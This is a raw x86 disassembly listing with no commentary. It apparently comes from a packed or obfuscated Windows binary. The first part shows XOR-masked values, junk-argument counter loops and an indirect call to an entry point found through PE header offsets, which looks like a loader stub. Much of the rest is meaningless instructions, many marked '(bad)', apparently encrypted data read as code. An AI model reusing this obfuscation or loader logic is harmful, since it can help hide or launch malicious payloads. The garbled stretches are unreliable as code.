  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e744
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4303dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4303dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4303dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42ebb3
  40991f:	mov    eax,ds:0x4303dd
  409924:	dec    eax
  409925:	mov    ds:0x4303dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430457
  409934:	or     eax,DWORD PTR ds:0x43045f
  40993a:	mov    ds:0x430457,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e750,0x13
  40994c:	cmp    DWORD PTR ds:0x42e750,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e750,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42ebb7
  409979:	mov    ecx,DWORD PTR ds:0x42e750
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e750,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4303c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4303d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43044f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43044f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43044f,edi
  4099bf:	cmp    DWORD PTR ds:0x43044f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4303bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42ea47
  4099e8:	cmp    DWORD PTR ds:0x43044f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43044f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43044f,edi
  409a02:	cmp    DWORD PTR ds:0x43044f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43045f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4303b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4303b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4303b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4303b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e983
  409a50:	cmp    DWORD PTR ds:0x4303b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4303b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4303b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4303b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e748
  409a7d:	or     DWORD PTR ds:0x42ed4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	dec    ebp
  409a95:	inc    esp
  409a96:	mov    esp,0x7edc5925
  409a9b:	jle    0x409acb
  409a9d:	jge    0x409b1d
  409a9f:	jle    0x409ac5
  409aa1:	pop    esi
  409aa2:	add    DWORD PTR [eax+0x3e68dcec],eax
  409aa8:	enter  0x9be,0x98
  409aac:	stos   BYTE PTR es:[edi],al
  409aad:	xchg   edx,eax
  409aae:	mov    esi,0x8a2a78ef
  409ab3:	adc    ebx,DWORD PTR [esp]
  409ab6:	push   cs
  409ab7:	xchg   esi,eax
  409ab8:	js     0x409ac7
  409aba:	jl     0x409a82
  409abc:	xchg   ebx,eax
  409abd:	xlat   BYTE PTR ds:[ebx]
  409abe:	(bad)  ds:[edx-0x1e61c6ae]
  409ac5:	nop
  409ac6:	call   0x8ffa:0x675f1674
  409acd:	push   esp
  409ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409acf:	aam    0x7d
  409ad1:	sub    edi,DWORD PTR [edx]
  409ad3:	(bad)  
  409ad4:	jb     0x409adc
  409ad6:	mov    ah,0x8f
  409ad8:	sbb    DWORD PTR [eax+0x6b],0xfffffffa
  409adc:	imul   ebp,DWORD PTR [ecx-0x9],0xeb45ad35
  409ae3:	jp     0x409a8a
  409ae5:	adc    DWORD PTR [ecx+0x37],0xecb2d185
  409aec:	cli    
  409aed:	fldcw  WORD PTR [eax+0x5d5a2bb]
  409af3:	(bad)  
  409af4:	daa    
  409af5:	jae    0x409b57
  409af7:	ret    
  409af8:	retf   0xc6e9
  409afb:	arpl   bx,dx
  409afd:	sbb    al,bh
  409aff:	xlat   BYTE PTR ds:[ebx]
  409b00:	popf   
  409b01:	iret   
  409b02:	and    al,0x40
  409b04:	sbb    edx,DWORD PTR [eax+0x4c2840c1]
  409b0a:	in     eax,0xa
  409b0c:	std    
  409b0d:	xchg   ebp,eax
  409b0e:	sub    al,0x54
  409b10:	sub    BYTE PTR [esi+edi*8],bl
  409b13:	imul   BYTE PTR [edx+ecx*2-0x54]
  409b17:	(bad)  
  409b18:	mov    edi,0x69b46c20
  409b1d:	cwde   
  409b1e:	popf   
  409b1f:	leave  
  409b20:	(bad)  
  409b21:	(bad)  
  409b23:	cld    
  409b24:	call   0xb59ef986
  409b29:	fist   WORD PTR [ebx+0x58]
  409b2c:	loop   0x409b0d
  409b2e:	mov    ds:0x5ed1478c,al
  409b33:	popa   
  409b34:	push   ebx
  409b35:	and    BYTE PTR [ebp+0xc],bh
  409b38:	mov    WORD PTR [esi],fs
  409b3a:	push   0xffffffcf
  409b3c:	xor    BYTE PTR [edx+0x77],al
  409b3f:	xchg   ebp,eax
  409b40:	repnz ss mov ebp,0x1f8a5d2
  409b47:	idiv   esp
  409b49:	sbb    bh,BYTE PTR [ecx]
  409b4b:	mov    bl,0x3c
  409b4d:	cmc    
  409b4e:	sbb    eax,0x7e89788e
  409b53:	push   DWORD PTR [edi]
  409b55:	mov    al,bh
  409b57:	cmc    
  409b58:	push   edi
  409b59:	cdq    
  409b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b5b:	repz sahf 
  409b5d:	and    ah,bh
  409b5f:	jb     0x409b7a
  409b61:	jl     0x409be0
  409b63:	rcr    BYTE PTR [ebx+eiz*8+0x5b5f12ad],0x8d
  409b6b:	mov    bh,0x2c
  409b6d:	imul   ecx,ebp,0x6e3955c1
  409b73:	mov    ebp,0xda7fe54a
  409b78:	xchg   ebx,eax
  409b79:	pusha  
  409b7a:	cmp    bl,BYTE PTR [ebx]
  409b7c:	cmp    eax,0x746a37c3
  409b81:	cmp    BYTE PTR [ecx-0x149bd5a1],al
  409b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b88:	mov    al,0xfa
  409b8a:	mov    WORD PTR [ecx],?
  409b8c:	pop    eax
  409b8d:	or     al,0xe2
  409b8f:	mov    edi,0x2470d61e
  409b94:	arpl   WORD PTR [ebp+0x51a145b3],ax
  409b9a:	inc    ebx
  409b9b:	int    0x76
  409b9d:	sbb    eax,0x926ad4be
  409ba2:	jecxz  0x409b79
  409ba4:	cmc    
  409ba5:	outs   dx,DWORD PTR ds:[esi]
  409ba6:	cwde   
  409ba7:	mov    bh,0xbf
  409ba9:	stc    
  409baa:	and    edx,esi
  409bac:	fsubr  DWORD PTR [edx-0x7a6bc7e2]
  409bb2:	or     DWORD PTR [edi+0x23],eax
  409bb5:	ins    BYTE PTR es:[edi],dx
  409bb6:	dec    esi
  409bb7:	mov    al,0x5c
  409bb9:	xor    ch,BYTE PTR [edi+0x77]
  409bbc:	or     dh,BYTE PTR [esi+0x15]
  409bbf:	jo     0x409bb6
  409bc1:	mov    ch,BYTE PTR [edx+0x3]
  409bc4:	mov    esp,0xc04711ef
  409bc9:	jl     0x409c14
  409bcb:	inc    edi
  409bcc:	adc    al,0x6e
  409bce:	mov    esi,0xdd9e8eed
  409bd3:	jp     0x409b9d
  409bd5:	mov    edi,0xb0a73629
  409bda:	loopne 0x409bbf
  409bdc:	push   ecx
  409bdd:	es not ch
  409be0:	and    eax,0x5ffacb2a
  409be5:	gs push esi
  409be7:	fisttp QWORD PTR [edi+ebp*4+0xd]
  409beb:	fcomp  QWORD PTR [eax+0x4b]
  409bee:	les    eax,FWORD PTR [ebx+0x33]
  409bf1:	and    eax,0x137cfa66
  409bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bf7:	cwde   
  409bf8:	add    ecx,DWORD PTR [edx+ebx*2]
  409bfb:	mov    WORD PTR [ebp-0x2f6ff3dd],fs
  409c01:	ret    
  409c02:	jge    0x409c6b
  409c04:	push   edi
  409c05:	int    0xf
  409c07:	xor    al,0xbd
  409c09:	hlt    
  409c0a:	aas    
  409c0b:	pop    ebp
  409c0c:	xchg   edx,eax
  409c0d:	inc    ebx
  409c0e:	mov    al,0x45
  409c10:	or     al,0x7d
  409c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c13:	into   
  409c14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c15:	mov    WORD PTR [edx+0x2ea9dc99],fs
  409c1b:	fld    DWORD PTR [edi]
  409c1d:	stc    
  409c1e:	stc    
  409c1f:	inc    esi
  409c20:	jl     0x409bbf
  409c22:	mov    bh,0x99
  409c24:	adc    ah,BYTE PTR [ebx-0x18376ab9]
  409c2a:	das    
  409c2b:	retf   0x802f
  409c2e:	sbb    DWORD PTR [edi+0x31],esp
  409c31:	jge    0x409c7a
  409c33:	rcr    DWORD PTR [ebp+0x25908d6d],1
  409c39:	xor    eax,0xda6260fa
  409c3e:	dec    edi
  409c3f:	lods   al,BYTE PTR ds:[esi]
  409c40:	inc    edi
  409c41:	mov    ebp,0x85949029
  409c46:	jmp    0x4c19:0x987ee311
  409c4d:	add    dh,al
  409c4f:	mov    ebx,0xb60937dd
  409c54:	sbb    esi,DWORD PTR [ecx+0x31]
  409c57:	mov    ds:0x2d5ffd28,al
  409c5c:	fs dec ebx
  409c5e:	sti    
  409c5f:	out    0xae,al
  409c61:	sbb    BYTE PTR [eax+0x2db437d7],cl
  409c67:	fistp  QWORD PTR [edx]
  409c69:	lock int 0xca
  409c6c:	repz int 0xa2
  409c6f:	add    DWORD PTR [edi],ebx
  409c71:	cld    
  409c72:	hlt    
  409c73:	arpl   WORD PTR [ecx+0x6d9c179],sp
  409c79:	or     eax,0x61c6328d
  409c7e:	out    0xa4,al
  409c80:	(bad)  
  409c81:	xchg   ebp,eax
  409c82:	add    dh,bh
  409c84:	sub    esp,DWORD PTR [ecx]
  409c86:	mov    dl,0xd5
  409c88:	lsl    ecx,WORD PTR [eax]
  409c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c8c:	pushf  
  409c8d:	push   es
  409c8e:	push   edx
  409c8f:	jl     0x409cf5
  409c91:	pop    ss
  409c92:	or     al,0x6b
  409c94:	(bad)  
  409c95:	jmp    0x409cc5
  409c97:	sub    edx,DWORD PTR [ecx]
  409c99:	jp     0x409cb9
  409c9b:	sti    
  409c9c:	dec    esp
  409c9d:	shr    DWORD PTR [edx],0xc6
  409ca0:	bswap  eax
  409ca2:	push   esp
  409ca3:	mov    esi,DWORD PTR [esi]
  409ca5:	cmp    ebp,edx
  409ca7:	pusha  
  409ca8:	stos   DWORD PTR es:[edi],eax
  409ca9:	mov    eax,0xf8b0c28
  409cae:	push   ss
  409caf:	ret    
  409cb0:	mov    ebp,0x80dbc1ae
  409cb5:	sar    DWORD PTR [edx+edx*2+0x1e],cl
  409cb9:	cmp    ebp,DWORD PTR [ebp+esi*1+0x1f]
  409cbd:	mov    bh,0x89
  409cbf:	ins    DWORD PTR es:[edi],dx
  409cc0:	push   edx
  409cc1:	nop
  409cc2:	rdpmc  
  409cc4:	mov    DWORD PTR [eax],0x6188d73b
  409cca:	sbb    al,0x95
  409ccc:	popf   
  409ccd:	xchg   edx,eax
  409cce:	imul   BYTE PTR [ecx-0x10f050a1]
  409cd4:	outs   dx,BYTE PTR ds:[esi]
  409cd5:	pop    edi
  409cd6:	pop    edx
  409cd7:	or     bh,BYTE PTR [edi-0x60]
  409cda:	jle    0x409d3a
  409cdc:	xchg   BYTE PTR [ecx],dh
  409cde:	xchg   edx,esi
  409ce0:	xor    ebx,DWORD PTR [eax+0xde6d13d]
  409ce6:	hlt    
  409ce7:	iret   
  409ce8:	or     esp,ebp
  409cea:	cs or  edx,ebx
  409ced:	cli    
  409cee:	adc    DWORD PTR [ebp+0x315d600],ebx
  409cf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cf5:	mov    eax,ds:0xcb933366
  409cfa:	ins    DWORD PTR es:[edi],dx
  409cfb:	fistp  WORD PTR [ecx]
  409cfd:	iret   
  409cfe:	jnp    0x409d69
  409d00:	and    ecx,DWORD PTR [ebp+0x64]
  409d03:	add    eax,0x381cd8a8
  409d08:	sbb    eax,0x43405f10
  409d0d:	jb     0x409ca6
  409d0f:	loope  0x409c93
  409d11:	mov    cl,0x3e
  409d13:	pop    ecx
  409d14:	adc    edx,DWORD PTR [si]
  409d17:	stc    
  409d18:	jle    0x409d64
  409d1a:	out    dx,al
  409d1b:	fcom   DWORD PTR [esi]
  409d1d:	idiv   DWORD PTR [ebp-0x6256f458]
  409d23:	mov    ch,0xd8
  409d25:	pushf  
  409d26:	inc    ebx
  409d27:	mov    ch,0xd0
  409d29:	out    0xea,eax
  409d2b:	add    ecx,DWORD PTR [ecx]
  409d2d:	jno    0x409d8c
  409d2f:	adc    edi,ecx
  409d31:	clc    
  409d32:	jbe    0x409d2d
  409d34:	and    BYTE PTR [edi-0x7c9ab64d],bh
  409d3a:	fdiv   st(4),st
  409d3c:	mov    eax,0xc091b4dc
  409d41:	xlat   BYTE PTR ds:[ebx]
  409d42:	ret    0xd9bd
  409d45:	aad    0x88
  409d47:	cs stos BYTE PTR es:[edi],al
  409d49:	addr16 pop ss
  409d4b:	sub    ah,BYTE PTR [ebx]
  409d4d:	out    dx,eax
  409d4e:	je     0x409cf3
  409d50:	(bad)  
  409d51:	mov    ch,0x30
  409d53:	aad    0x4c
  409d55:	push   esp
  409d56:	mov    ch,0x95
  409d58:	jne    0x409d5a
  409d5a:	jae    0x409da8
  409d5c:	ins    BYTE PTR es:[edi],dx
  409d5d:	cmc    
  409d5e:	jo     0x409da8
  409d60:	in     al,0x4
  409d62:	mov    dl,0x16
  409d64:	stos   DWORD PTR es:[edi],eax
  409d65:	xlat   BYTE PTR ds:[ebx]
  409d66:	mov    ah,0x81
  409d68:	inc    ebp
  409d69:	stos   DWORD PTR es:[edi],eax
  409d6a:	or     ah,BYTE PTR [bp+si]
  409d6d:	xchg   esp,eax
  409d6e:	dec    ecx
  409d6f:	addr16 or ecx,edx
  409d72:	xchg   DWORD PTR [eax+0x22],esp
  409d75:	in     eax,dx
  409d76:	mov    al,ds:0x5f99a9a8
  409d7b:	pop    ebp
  409d7c:	or     cl,0x5b
  409d7f:	cdq    
  409d80:	leave  
  409d81:	jl     0x409db5
  409d83:	add    al,0x26
  409d85:	sbb    al,0xb4
  409d87:	xchg   ebx,eax
  409d88:	push   ss
  409d89:	xchg   ebx,eax
  409d8a:	jno    0x409d76
  409d8c:	jg     0x409e09
  409d8e:	mov    ds:0xd22fa1e3,al
  409d93:	aam    0xf8
  409d95:	aas    
  409d96:	jl     0x409d84
  409d98:	jle    0x409dd8
  409d9a:	or     esi,edx
  409d9c:	jnp    0x409e1b
  409d9e:	xchg   esp,eax
  409d9f:	mov    al,ds:0x4d02b399
  409da4:	dec    esp
  409da5:	xchg   edi,eax
  409da6:	retf   
  409da7:	add    ah,cl
  409da9:	dec    edx
  409daa:	xchg   edx,eax
  409dab:	sbb    al,0xb6
  409dad:	mov    bh,BYTE PTR [ecx-0x14]
  409db0:	fst    QWORD PTR [eax]
  409db2:	cmp    al,0x83
  409db4:	or     eax,DWORD PTR [edx-0x28]
  409db7:	retf   0x6e5a
  409dba:	sahf   
  409dbb:	push   esi
  409dbc:	pop    ebp
  409dbd:	unpckhps xmm7,XMMWORD PTR [ecx]
  409dc0:	out    0x3f,al
  409dc2:	xchg   esp,eax
  409dc3:	or     esi,DWORD PTR ds:0x549d0148
  409dc9:	mov    ds:0xe0681984,al
  409dce:	sbb    eax,ebp
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e758
  409dd8:	add    ebx,DWORD PTR ds:0x430457
  409dde:	mov    DWORD PTR ds:0x42e758,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4303dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43044f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4303d1
  409e03:	and    DWORD PTR ds:0x4303f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4303cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e9b
  409e2b:	pop    es
  409e2c:	xor    ecx,DWORD PTR es:[ecx]
  409e2f:	fdivr  DWORD PTR [esi+0x7e]
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e34
  409e37:	aam    0x41
  409e39:	sub    DWORD PTR [ebx],ebp
  409e3b:	push   ebx
  409e3c:	test   eax,0xdcb9ec45
  409e41:	push   esp
  409e42:	jns    0x409e26
  409e44:	cs sub eax,0xc0ec6d3c
  409e4a:	repnz mov dl,0x6a
  409e4d:	fisubr WORD PTR [ebp-0x72a5962f]
  409e53:	mov    ?,WORD PTR [ebx-0x30bb5533]
  409e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e5a:	cmc    
  409e5b:	mov    ch,0xf6
  409e5d:	mov    BYTE PTR [esi],bl
  409e5f:	mov    eax,ds:0xd9d4b2d1
  409e64:	adc    al,0xf7
  409e66:	or     DWORD PTR [ebx+0x6f69ea5e],edi
  409e6c:	hlt    
  409e6d:	cmc    
  409e6e:	cmp    eax,DWORD PTR [esi]
  409e70:	jne    0x409e3a
  409e72:	dec    esp
  409e73:	and    dl,bl
  409e75:	out    dx,eax
  409e76:	or     BYTE PTR [ebx+0x6768dc2a],0x20
  409e7d:	cmp    al,0x5a
  409e7f:	call   0xfee101c6
  409e84:	in     al,dx
  409e85:	or     al,0xd3
  409e87:	test   eax,0x81d9fac1
  409e8c:	mov    ah,BYTE PTR [eax-0x6b692f2]
  409e92:	sahf   
  409e93:	dec    eax
  409e94:	jge    0x409efc
  409e96:	dec    esi
  409e97:	cli    
  409e98:	pop    eax
  409e99:	popa   
  409e9a:	pop    ebp
  409e9b:	push   ss
  409e9c:	push   ss
  409e9d:	adc    al,BYTE PTR [ecx]
  409e9f:	mov    esi,0xbe437ea6
  409ea4:	cmp    BYTE PTR [esi-0x66b85d69],dl
  409eaa:	cmp    DWORD PTR [ebx],eax
  409eac:	pop    es
  409ead:	fild   WORD PTR [ebx+edi*2-0x4d]
  409eb1:	es cmp al,0xdb
  409eb4:	je     0x409ea3
  409eb6:	cmovbe ebp,DWORD PTR [eax+0x33]
  409eba:	and    esp,DWORD PTR [edi+0x431a4081]
  409ec0:	loope  0x409e9f
  409ec2:	stc    
  409ec3:	add    eax,0x44c5addb
  409ec8:	jmp    0x409f30
  409eca:	add    ch,al
  409ecc:	sti    
  409ecd:	mov    WORD PTR [esi-0x5007b2c3],cs
  409ed3:	pop    ebx
  409ed4:	ins    BYTE PTR es:[edi],dx
  409ed5:	sahf   
  409ed6:	mov    edx,0xbd0b7157
  409edb:	sub    ah,BYTE PTR [edx+0x30dd2d19]
  409ee1:	popf   
  409ee2:	add    edi,DWORD PTR [ebx]
  409ee4:	xor    eax,0x75591265
  409ee9:	test   bh,cl
  409eeb:	fwait
  409eec:	ret    
  409eed:	inc    esi
  409eee:	scas   al,BYTE PTR es:[edi]
  409eef:	jns    0x409f19
  409ef1:	adc    eax,0x69ec9557
  409ef6:	je     0x409eaf
  409ef8:	sbb    bh,BYTE PTR [edx+0x2375f2e8]
  409efe:	jns    0x409ec6
  409f00:	sub    ah,bh
  409f02:	xchg   edx,eax
  409f03:	push   edi
  409f04:	shr    BYTE PTR [esi+eiz*2+0x2e43d828],0x8b
  409f0c:	xor    eax,0x34647d9a
  409f11:	retf   0x85a1
  409f14:	push   ecx
  409f15:	dec    edx
  409f16:	repz mov dl,dh
  409f19:	jp     0x409f1e
  409f1b:	out    0x62,al
  409f1d:	xor    DWORD PTR [esp+eiz*2],ebx
  409f20:	popa   
  409f21:	add    eax,0x68
  409f24:	xchg   esp,eax
  409f25:	xor    BYTE PTR [ebp+esi*4+0x56],bl
  409f29:	pop    esp
  409f2a:	pushf  
  409f2b:	jg     0x409ecc
  409f2d:	in     eax,dx
  409f2e:	jp     0x409f73
  409f30:	nop
  409f31:	(bad)  
  409f32:	ficomp WORD PTR [esi]
  409f34:	jae    0x409eec
  409f36:	push   0xf1035989
  409f3b:	js     0x409f8d
  409f3d:	popf   
  409f3e:	out    0xac,al
  409f40:	test   bh,ch
  409f42:	xor    dh,BYTE PTR [edi-0x478d69fa]
